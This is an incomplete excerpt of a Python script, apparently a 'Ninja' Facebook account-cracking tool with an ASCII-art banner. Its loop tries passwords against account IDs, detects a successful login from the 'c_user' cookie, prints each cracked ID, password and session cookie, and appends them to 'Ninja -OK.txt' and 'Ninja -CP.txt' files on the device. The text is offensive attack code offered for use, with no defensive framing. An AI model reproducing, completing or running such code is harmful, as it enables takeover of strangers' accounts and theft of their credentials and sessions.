...
| $$\  $$$  | $$  | $$\  $$$| $$  | $$| $$  | $$      
| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/| $$  | $$      
|__/  \__/|______/|__/  \__/ \______/ |__/  |__/      \033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[Ninja -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Ninja -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Ninja -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[Ninja ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
